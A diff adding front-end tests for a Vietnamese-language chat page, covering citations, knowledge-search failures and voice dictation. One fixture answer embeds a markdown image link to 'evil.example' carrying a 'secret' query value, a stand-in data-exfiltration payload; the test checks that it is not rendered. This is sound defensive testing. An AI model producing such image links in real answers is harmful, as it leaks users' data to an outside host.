@@ -3,7 +3,18 @@ import { createMemoryRouter, RouterProvider } from "react-router-dom";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { AuthProvider } from "@/hooks/auth";
 import { AuthClient } from "@/services/auth-api";
+import { MicRecorder } from "@/services/mic-recorder";
 import { ConversationsPage } from "./conversations";
+
+vi.mock("@/services/mic-recorder", async (actual) => ({
+  ...(await actual<typeof import("@/services/mic-recorder")>()),
+  MicRecorder: {
+    open: vi.fn(async () => ({
+      stop: async () => undefined,
+      toWav: () => new Blob(["RIFF"], { type: "audio/wav" }),
+    })),
+  },
+}));
 
 const chat = (id: string, title: string) => ({
   id,
@@ -41,8 +52,10 @@ type Stream = ReturnType<typeof openStream>;
 function serve(
   histories: Record<string, unknown[]>,
   createGate?: Promise<void>,
+  transcription?: () => Promise<Response>,
 ) {
   const streams: Stream[] = [];
+  const speechCalls: unknown[] = [];
   const created: unknown[] = [];
   const fetch = vi.fn(async (url: string, init?: RequestInit) => {
     const method = init?.method ?? "GET";
@@ -65,6 +78,10 @@ function serve(
         messages: histories[history[1]] ?? [],
         truncated: false,
       });
+    if (url === "/v1/speech/transcriptions") {
+      speechCalls.push(init?.body);
+      return (await transcription?.()) ?? Response.json({ text: "" });
+    }
     if (url.endsWith("/stream")) {
       const stream = openStream(init?.signal);
       streams.push(stream);
@@ -73,7 +90,7 @@ function serve(
     throw new Error(`Unexpected request: ${method} ${url}`);
   });
   vi.stubGlobal("fetch", fetch);
-  return { fetch, streams, created };
+  return { fetch, streams, created, speechCalls };
 }
 
 function show(path: string) {
@@ -138,6 +155,129 @@ describe("ConversationsPage", () => {
     await waitFor(() => expect(answer).toHaveAttribute("data-status", "saved"));
     expect(answer).toHaveTextContent("Kiểm tra cảm biến áp suất.");
     expect(answer).not.toHaveTextContent("Kiểm tra tạm");
+  });
+
+  it("links only saved citations and opens their excerpt", async () => {
+    const citation = {
+      marker: "S1",
+      evidence_id: "chunk-71",
+      title: "MR-JE manual",
+      excerpt: "E12: kiểm tra cảm biến áp suất.",
+      location: "trang 71",
+    };
+    serve({
+      "chat-a": [
+        { role: "user", text: "Lỗi E12" },
+        {
+          role: "assistant",
+          text: "Kiểm tra cảm biến [S1]. Ca cũ [S4]. ![x](https://evil.example/?d=secret) [giả](#cite-S9)",
+          citations: [citation],
+        },
+      ],
+    });
+    show("/ask/chat-a");
+    const marker = await screen.findByRole("button", { name: "Mở nguồn S1" });
+    expect(
+      screen.queryByRole("button", { name: "Mở nguồn S4" }),
+    ).not.toBeInTheDocument();
+    expect(screen.getByTestId("chat-answer")).toHaveTextContent("[S4]");
+
+    expect(document.querySelector("img")).toBeNull();
+    expect(
+      screen.queryByRole("button", { name: "Mở nguồn S9" }),
+    ).not.toBeInTheDocument();
+
+    fireEvent.click(marker);
+    const card = screen.getByTestId("citation-card");
+    expect(card).toHaveTextContent("MR-JE manual");
+    expect(card).toHaveTextContent("trang 71");
+    expect(card).toHaveTextContent("E12: kiểm tra cảm biến áp suất.");
+  });
+
+  it("says when the knowledge search found nothing or failed", async () => {
+    const { streams } = serve({});
+    show("/ask/chat-a");
+    await screen.findByText(/Máy đang gặp vấn đề gì/);
+    ask("Lỗi E12");
+    await waitFor(() => expect(streams).toHaveLength(1));
+    streams[0].push(
+      'event: complete\ndata: {"answer":"Không có.","citations":[],"search":"unavailable"}\n\n',
+    );
+    expect(
+      await screen.findByText(
+        "Không tra cứu được kho tri thức cho câu hỏi này.",
+      ),
+    ).toBeInTheDocument();
+  });
+
+  it("puts a transcript in the composer for editing and sends the edited text", async () => {
+    const { streams, speechCalls } = serve({}, undefined, async () =>
+      Response.json({ text: "máy ép báo lỗi e mười hai" }),
+    );
+    show("/ask/chat-a");
+    await screen.findByText(/Máy đang gặp vấn đề gì/);
+    fireEvent.click(screen.getByTestId("dictation"));
+    await screen.findByRole("button", { name: "Dừng ghi âm" });
+    fireEvent.click(screen.getByTestId("dictation"));
+
+    const input = screen.getByTestId("chat-input") as HTMLTextAreaElement;
+    await waitFor(() => expect(input.value).toBe("máy ép báo lỗi e mười hai"));
+    expect(speechCalls[0]).toBeInstanceOf(FormData);
+    expect(streams).toHaveLength(0);
+
+    fireEvent.change(input, { target: { value: "Máy ép báo lỗi E12" } });
+    fireEvent.click(screen.getByTestId("chat-send"));
+    await waitFor(() => expect(streams).toHaveLength(1));
+    expect(screen.getByTestId("chat-question")).toHaveTextContent(
+      "Máy ép báo lỗi E12",
+    );
+  });
+
+  it("shows a speech failure and ignores a transcript that arrives after switching chats", async () => {
+    let respond!: (response: Response) => void;
+    serve(
+      { "chat-b": [] },
+      undefined,
+      () => new Promise<Response>((resolve) => (respond = resolve)),
+    );
+    const router = show("/ask/chat-a");
+    await screen.findByText(/Máy đang gặp vấn đề gì/);
+    fireEvent.click(screen.getByTestId("dictation"));
+    await screen.findByRole("button", { name: "Dừng ghi âm" });
+    fireEvent.click(screen.getByTestId("dictation"));
+    await waitFor(() => expect(respond).toBeDefined());
+    await router.navigate("/ask/chat-b");
+    await waitFor(() =>
+      expect(screen.getByTestId("conversation-select")).toHaveValue("chat-b"),
+    );
+    respond(Response.json({ text: "câu cũ" }));
+    await waitFor(() =>
+      expect(screen.getByTestId("dictation")).not.toBeDisabled(),
+    );
+    expect(
+      (screen.getByTestId("chat-input") as HTMLTextAreaElement).value,
+    ).toBe("");
+
+    fireEvent.click(screen.getByTestId("dictation"));
+    await screen.findByRole("button", { name: "Dừng ghi âm" });
+    fireEvent.click(screen.getByTestId("dictation"));
+    await waitFor(() => expect(respond).toBeDefined());
+    respond(Response.json({ detail: "x" }, { status: 503 }));
+    expect(await screen.findByTestId("dictation-error")).toHaveTextContent(
+      "Không nhận dạng được giọng nói lúc này",
+    );
+  });
+
+  it("opens the microphone once when the mic button is pressed twice quickly", async () => {
+    serve({});
+    const open = vi.mocked(MicRecorder.open);
+    open.mockClear();
+    show("/ask/chat-a");
+    await screen.findByText(/Máy đang gặp vấn đề gì/);
+    fireEvent.click(screen.getByTestId("dictation"));
+    fireEvent.click(screen.getByTestId("dictation"));
+    await screen.findByRole("button", { name: "Dừng ghi âm" });
+    expect(open).toHaveBeenCalledTimes(1);
   });
 
   it("titles a new chat from a multi-line first message without line breaks", async () => {
